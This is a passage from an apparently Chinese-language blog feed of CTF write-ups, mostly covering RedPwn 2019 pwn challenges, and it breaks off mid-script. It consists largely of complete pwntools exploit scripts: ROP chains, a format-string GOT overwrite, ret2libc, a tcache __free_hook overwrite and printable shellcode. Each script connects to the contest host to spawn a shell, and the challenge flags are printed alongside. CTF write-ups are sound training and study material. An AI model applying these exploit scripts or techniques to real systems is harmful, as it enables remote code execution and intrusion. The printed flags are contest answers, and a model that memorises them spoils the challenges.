class="line">原始高度为256，修改后479</span><br></pre></td></tr></tbody></table></figure></div><h2 id="flag-He1l0-d4-ba1"><a href="#flag-He1l0-d4-ba1" class="headerlink" title="flag{He1l0_d4_ba1}"></a>flag{He1l0_d4_ba1}</h2><h2 id="0x04-派大星的烦恼"><a href="#0x04-派大星的烦恼" class="headerlink" title="0x04 派大星的烦恼"></a>0x04 派大星的烦恼</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RedPwn-19年8月</title>
      <link href="/2019/08/13/CTF-RedPwn-19%E5%B9%B48%E6%9C%88/"/>
      <url>/2019/08/13/CTF-RedPwn-19%E5%B9%B48%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x1-BabbyPwn"><a href="#0x1-BabbyPwn" class="headerlink" title="0x1 BabbyPwn"></a>0x1 BabbyPwn</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连进去 然后等着，就会出flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="0x2-Bronze-Ropchain"><a href="#0x2-Bronze-Ropchain" class="headerlink" title="0x2 Bronze Ropchain"></a>0x2 Bronze Ropchain</h3><h3 id="存在栈溢出，然后可以考虑使用ROPgadget，并且去除-x00字符和换行符"><a href="#存在栈溢出，然后可以考虑使用ROPgadget，并且去除-x00字符和换行符" class="headerlink" title="存在栈溢出，然后可以考虑使用ROPgadget，并且去除\x00字符和换行符"></a>存在栈溢出，然后可以考虑使用ROPgadget，并且去除\x00字符和换行符</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./bronze_ropchain --badbytes "00|0a" --ropchain</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># execve generated by ROPgadget</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line"># context.log_level = 'debug'</span><br><span class="line"># Padding goes here</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<i', 0x0806ef2b) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080da060) # @ .data< span><br><span class="line">p += pack('<i', 0x080564b4) # pop eax ; edx ebx ret< span><br><span class="line">p += '/bin'</span><br><span class="line">p += pack('<i', 0x080da060) # padding without overwrite edx< span><br><span class="line">p += pack('<i', 0x41414141) # padding< span><br><span class="line">p += pack('<i', 0x08056fe5) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806ef2b) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080da064) # @ .data + 4< span><br><span class="line">p += pack('<i', 0x080564b4) # pop eax ; edx ebx ret< span><br><span class="line">p += '//sh'</span><br><span class="line">p += pack('<i', 0x080da064) # padding without overwrite edx< span><br><span class="line">p += pack('<i', 0x41414141) # padding< span><br><span class="line">p += pack('<i', 0x08056fe5) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806ef2b) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080da068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080565a0) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x08056fe5) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x080481c9) # pop ebx ; ret< span><br><span class="line">p += pack('<i', 0x080da060) # @ .data< span><br><span class="line">p += pack('<i', 0x0806ef52) # pop ecx ; ebx ret< span><br><span class="line">p += pack('<i', 0x080da068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080da060) # padding without overwrite ebx< span><br><span class="line">p += pack('<i', 0x0806ef2b) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080da068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080565a0) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807c3ba) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x080495b3) # int 0x80< span><br><span class="line">payload = 'A'*28 + p</span><br><span class="line">#r = process('bronze_ropchain')</span><br><span class="line">r = remote('chall.2019.redpwn.net',4004)</span><br><span class="line">r.recvuntil('What is your name?\n')</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline('')</span><br><span class="line">r.interactive()</span><br></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></pre></td></tr></tbody></table></figure></div><h3 id="0x3-Bronze-Ropchain"><a href="#0x3-Bronze-Ropchain" class="headerlink" title="0x3 Bronze Ropchain"></a>0x3 Bronze Ropchain</h3><h3 id="yeet里的漏洞可以改变chunk-head的值，然后控制got"><a href="#yeet里的漏洞可以改变chunk-head的值，然后控制got" class="headerlink" title="yeet里的漏洞可以改变chunk_head的值，然后控制got"></a>yeet里的漏洞可以改变chunk_head的值，然后控制got</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("dennis")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">sh.recvuntil("Command me: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def show(size):</span><br><span class="line">sh.recvuntil("Command me: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def edit(content):</span><br><span class="line">sh.recvuntil("me: ")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(content)</span><br><span class="line">def free():</span><br><span class="line">sh.recvuntil("Command me: ")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">def vul():</span><br><span class="line">sh.recvuntil("Command me: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./dennis")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">chunk_head = 0x0804B050</span><br><span class="line">add(0x8)</span><br><span class="line">free()</span><br><span class="line">add(0x8)</span><br><span class="line">edit(p32(0x0804B004) + p32(chunk_head))</span><br><span class="line">vul()</span><br><span class="line">show(0x18)</span><br><span class="line">free_got = u32(sh.recvuntil("Command",True)[-4:])</span><br><span class="line">libc = free_got - lib.symbols['free']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">log.success("free: " + hex(free_got))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">payload  = '/bin/sh\x00'</span><br><span class="line">payload += p32(libc + lib.symbols['setbuf'])</span><br><span class="line">payload += p32(libc + lib.symbols['printf'])</span><br><span class="line">payload += p32(libc + lib.symbols['gets'])</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(libc + lib.symbols['fgets'])</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("chall.2019.redpwn.net",4006,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x4-HARDMODE"><a href="#0x4-HARDMODE" class="headerlink" title="0x4 HARDMODE"></a>0x4 HARDMODE</h2><h3 id="题目打开直接拿到shell，然后cat-flag-txt，很脑洞的是"><a href="#题目打开直接拿到shell，然后cat-flag-txt，很脑洞的是" class="headerlink" title="题目打开直接拿到shell，然后cat flag.txt，很脑洞的是"></a>题目打开直接拿到shell，然后cat flag.txt，很脑洞的是</h3><h3 id="flag就是下面这一行"><a href="#flag就是下面这一行" class="headerlink" title="flag就是下面这一行"></a>flag就是下面这一行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat: flag.txt: No such file or directory</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x5-Rot26"><a href="#0x5-Rot26" class="headerlink" title="0x5 Rot26"></a>0x5 Rot26</h2><h3 id="简单的格式化字符串漏洞"><a href="#简单的格式化字符串漏洞" class="headerlink" title="简单的格式化字符串漏洞"></a>简单的格式化字符串漏洞</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">#p = process('./rot26')</span><br><span class="line">p = remote('chall.2019.redpwn.net',4003)</span><br><span class="line">elf = ELF('./rot26')</span><br><span class="line">shell = 0x8048737</span><br><span class="line">offset = 7</span><br><span class="line">payload = fmtstr_payload(offset, {elf.got['exit']:shell})</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{w4it_d03s_r0t26_4ctu4lly_ch4ng3_4nyth1ng?}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x5-Stop-ROP-n’-Roll"><a href="#0x5-Stop-ROP-n’-Roll" class="headerlink" title="0x5 Stop, ROP, n’, Roll"></a>0x5 Stop, ROP, n’, Roll</h2><h3 id="构造-s，然后printf去libc-leak，然后就是ret2libc"><a href="#构造-s，然后printf去libc-leak，然后就是ret2libc" class="headerlink" title="构造%s，然后printf去libc leak，然后就是ret2libc"></a>构造%s，然后printf去libc leak，然后就是ret2libc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("srnr")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./srnr")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sh.recvuntil('[#] number of bytes: ')</span><br><span class="line">pop_rdi_ret = 0x400823</span><br><span class="line">pop_rsi_r15_ret = 0x400821</span><br><span class="line">offset = 9 + 8</span><br><span class="line">payload  = offset * 'a'</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.bss() + 0x800) * 2</span><br><span class="line">payload += p64(elf.plt['read'])</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf.bss() + 0x800)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.got['__libc_start_main']) * 2</span><br><span class="line">payload += p64(elf.plt['printf'])</span><br><span class="line">payload += p64(elf.symbols['_start'])</span><br><span class="line">sh.sendline("0")</span><br><span class="line">sleep(2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(2)</span><br><span class="line">sh.sendline("%s")</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f",False).ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sleep(2)</span><br><span class="line">sh.recvuntil('[#] number of bytes: ')</span><br><span class="line">sh.sendline("0")</span><br><span class="line"></span><br><span class="line">payload  = offset * 'a'</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sleep(2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">log.success("__libc_start_main:" + hex(__libc_start_main))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("chall.2019.redpwn.net",4008,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x7-penpal-world"><a href="#0x7-penpal-world" class="headerlink" title="0x7 penpal world"></a>0x7 penpal world</h2><h3 id="tcache攻击，然后leak-libc，然后覆盖-free-hook为system，然后free-“-bin-sh-x00”-即可"><a href="#tcache攻击，然后leak-libc，然后覆盖-free-hook为system，然后free-“-bin-sh-x00”-即可" class="headerlink" title="tcache攻击，然后leak libc，然后覆盖__free_hook为system，然后free(“/bin/sh\x00”)即可"></a>tcache攻击，然后leak libc，然后覆盖__free_hook为system，然后free(“/bin/sh\x00”)即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("penpal_world")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx):</span><br><span class="line">    sh.recvuntil("Read a postcard")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("Which envelope #?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.recvuntil("Read a postcard")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("Which envelope #?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil("Write")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil("Read a postcard")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil("Which envelope #?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.recvuntil("Read a postcard")</span><br><span class="line">    sh.sendline("4")</span><br><span class="line">    sh.recvuntil("Which envelope #?")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./penpal_world")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.27.so")</span><br><span class="line">    add(0)</span><br><span class="line">    add(1)</span><br><span class="line">    add(1)</span><br><span class="line">    add(1)</span><br><span class="line">    free(1)</span><br><span class="line">    free(1)</span><br><span class="line">    show(1)</span><br><span class="line">    heap_base = u64(sh.recvuntil("\x0a\x4f\x50",True).ljust(8,'\x00')) >> 8</span><br><span class="line">    heap_base = heap_base - 0x350</span><br><span class="line">    edit(1,p64(heap_base + 0x250))</span><br><span class="line">    add(1)</span><br><span class="line">    add(1)</span><br><span class="line">    edit(1,p64(0) + p64(0xa1))</span><br><span class="line">    for i in range(7):</span><br><span class="line">        free(0)</span><br><span class="line">    free(0)</span><br><span class="line">    show(0)</span><br><span class="line">    main_arena = (u64(sh.recvuntil("\x7f",False).ljust(8,'\x00')) >> 8) - 96</span><br><span class="line">    libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line"></span><br><span class="line">    add(1)</span><br><span class="line">    free(1)</span><br><span class="line">    edit(1,p64(__free_hook))</span><br><span class="line">    add(1)</span><br><span class="line">    add(1)</span><br><span class="line">    edit(1,p64(system))</span><br><span class="line">    add(1)</span><br><span class="line">    edit(1,'/bin/sh\x00')</span><br><span class="line">    free(1)</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("main_arena: " + hex(main_arena))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    if debug == 1:</span><br><span class="line">        log.success("pid = " + str(sh.pid))</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("chall.2019.redpwn.net",4010,0)</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{0h_n0e5_sW1p3r_d1D_5w!peEEeE}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x8-knuth"><a href="#0x8-knuth" class="headerlink" title="0x8 knuth"></a>0x8 knuth</h2><h3 id="典型的shellcode，但是加了限制条件，必须是0x20到0x7f之间或者0x0a"><a href="#典型的shellcode，但是加了限制条件，必须是0x20到0x7f之间或者0x0a" class="headerlink" title="典型的shellcode，但是加了限制条件，必须是0x20到0x7f之间或者0x0a"></a>典型的shellcode，但是加了限制条件，必须是0x20到0x7f之间或者0x0a</h3><h3 id="可以通过栈迁移，构造超出限制的shellcode"><a href="#可以通过栈迁移，构造超出限制的shellcode" class="headerlink" title="可以通过栈迁移，构造超出限制的shellcode"></a>可以通过栈迁移，构造超出限制的shellcode</h3><h3 id="但是需要一些数学运算"><a href="#但是需要一些数学运算" class="headerlink" title="但是需要一些数学运算"></a>但是需要一些数学运算</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("knuth")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./knuth")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">call_eax = 0x08048692</span><br><span class="line">payload = asm('push eax')</span><br><span class="line">payload += asm('pop eax')</span><br><span class="line">payload = payload * 16</span><br><span class="line">payload += asm("push ecx")</span><br><span class="line">payload += asm('push ecx')</span><br><span class="line">payload += asm("pop edx")</span><br><span class="line">payload += asm("push 0x68732f2f")</span><br><span class="line">payload += asm('push 0x6e69622f')</span><br><span class="line">payload += asm('push esp')</span><br><span class="line">payload += asm('pop ebx')</span><br><span class="line">payload += asm('push ecx')*2</span><br><span class="line">payload += asm('push eax')</span><br><span class="line">payload += asm('pop edi')</span><br><span class="line">payload += asm("or al,[eax+0x23]")</span><br><span class="line">payload += asm('push eax')</span><br><span class="line">payload += asm('push edi')</span><br><span class="line">payload += asm('pop eax')</span><br><span class="line">payload += asm('xor 